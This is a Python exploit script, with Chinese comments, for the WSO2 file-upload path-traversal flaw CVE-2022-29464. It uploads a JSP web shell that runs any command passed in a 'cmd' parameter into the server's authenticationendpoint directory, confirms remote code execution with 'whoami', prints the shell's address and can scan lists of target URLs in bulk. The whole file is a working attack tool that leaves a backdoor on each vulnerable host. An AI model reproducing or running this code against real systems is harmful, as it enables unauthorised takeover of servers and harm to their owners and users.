"""
-*- codeing = utf-8 -*-
======================
@author:Axin1st
======================
"""
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys
import getopt
import requests
from requests.packages import urllib3
urllib3.disable_warnings()


def http(url):
    if "https" in url:
        return url
    elif "http" in url:
        return url
    else:
        return "https://" + url


def Poc(url):
    # 代理池设置
    proxy = {
        'http': '127.0.0.1:8080',
        'https': '127.0.0.1:8080'
    }
# command to execute replace "id" in payload
    payload = '''\r--4ef9f369a86bfaadf5ec3177278d49c0\r
Content-Disposition: form-data; name="exp.jsp"; filename="exp.jsp"\r
\r
<FORM>\r
    <INPUT name='cmd' type=text>\r
    <INPUT type=submit value='Run'>\r
</FORM>\r
<%@ page import="java.io.*" %>\r
    <%\r
    String cmd = request.getParameter("cmd");\r
    String output = "";\r
    if(cmd != null) {\r
        String s = null;\r
        try {\r
            Process p = Runtime.getRuntime().exec(cmd,null,null);\r
            BufferedReader sI = new BufferedReader(new\r
InputStreamReader(p.getInputStream()));\r
            while((s = sI.readLine()) != null) { output += s+"</br>"; }\r
        }  catch(IOException e) {   e.printStackTrace();   }\r
    }\r
%>\r
        <pre><%=output %></pre>\r
--4ef9f369a86bfaadf5ec3177278d49c0--'''
    payload2 = '''\r--4ef9f369a86bfaadf5ec3177278d49c0\r
Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/exp.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/exp.jsp"\r
\r
<FORM>\r
    <INPUT name='cmd' type=text>\r
    <INPUT type=submit value='Run'>\r
</FORM>\r
<%@ page import="java.io.*" %>\r
    <%\r
    String cmd = request.getParameter("cmd");\r
    String output = "";\r
    if(cmd != null) {\r
        String s = null;\r
        try {\r
            Process p = Runtime.getRuntime().exec(cmd,null,null);\r
            BufferedReader sI = new BufferedReader(new\r
InputStreamReader(p.getInputStream()));\r
            while((s = sI.readLine()) != null) { output += s+"</br>"; }\r
        }  catch(IOException e) {   e.printStackTrace();   }\r
    }\r
%>\r
        <pre><%=output %></pre>\r
--4ef9f369a86bfaadf5ec3177278d49c0--'''

# 请求头部分构造
    headers1 = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    }

    headers2 = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
    }
    try:
        re0 = requests.get(url, headers=headers1)
        # print(re0)
        if re0.status_code == 200 or re0.status_code == 406:
            re1 = requests.post(url=url + "/fileupload/toolsAny", data=payload, headers=headers1)
            # print(re1)
            # print('******第一步完成*********')
            re2 = requests.post(url=url + "/fileupload/toolsAny", data=payload2, headers=headers2)
            # print(re2)
            # print('******第二步完成*********')
            # print('返回结果为:'+ re2.text)
            if re2.status_code == 200:
                re3 = requests.get(url=url + "/authenticationendpoint/exp.jsp?cmd=whoami")
                # print(re3.text)
                # print('******第三步完成*********')
                res = re.findall(r'<pre>(.*?)</br></pre>', re3.text)
                cmd_whoami = "cmd=>whoami返回结果：{}".format(res[0])
                if re3.status_code == 200:
                    exp = '存在该漏洞,shell地址为:{}/authenticationendpoint/exp.jsp {}'.format(url, cmd_whoami)
                    return exp
        else:
            err = '目标{}不存在该漏洞，请手动验证确保无误'.format(url)
            return err
    except Exception as e:
        print(e)
        err = '目标{}不存在该漏洞，请手动验证确保无误'.format(url)
        return err


# getopt命令行参数   推荐使用
# sys.argv获取的命令行参数进行二次处理
def start1(argv):
    u = ""
    p = ""
    if len(sys.argv) < 2:
        print("使用方法："
                  "\npython3 Wso2-CVE-2022-29464.py -u 单个URL检测\n"
                  "\npython3 Wso2-CVE-2022-29464.py -p 批量检测文本中的URL\n")
        sys.exit()
    opts, argv = getopt.getopt(argv, "u:p:", ["file="])
    # print("opts:", opts)    # opts：是 (选项, 选项值) 的元组为一个元素的列表。如果没有选项值为空字符串；
    # print("argv:", argv)    # args：存放没用选项单参数的列表。不属于格式信息的剩余的命令行参数；
    for opt, arg in opts:    # 遍历opts的内容，即输入的命令参数
        if opt == "-u":     # 命令参数为 -u 时
            url = arg       # 获取命令参数 -u 所要传输的值
            print('*' * 70)
            retu = Poc(http(url))
            print(retu)
            print('*' * 70)
        elif opt == "-p":  # 命令参数为 -p 时
            pages = arg    # 获取命令参数 -p 所要传的值
            # print(pages)   # 具体作何功能你定
            try:
                with open(pages, 'r') as f:       # 打开文件
                    ff = f.read()                   # 读取整文件内容
                    lists = ff.split('\n')          # 以换行作为数据分割
                    for i in lists:                 # 便利数据
                            print("--------------------------------------")
                            retu = Poc(http(i))
                            print(retu)
            except Exception as e:
                pass

        elif opt == "-h":
            print("使用方法："
                  "------------------------------------"
                  "python3 Wso2-CVE-2022-29464 -u 单个URL检测"
                  "------------------------------------"
                  "python3 Wso2-CVE-2022-29464 -p 批量检测文本中的URL"
                  "------------------------------------")


if __name__ == '__main__':
    try:
        start1(sys.argv[1:])
    except KeyboardInterrupt:
        print("interrupted by user, killing all threads...")
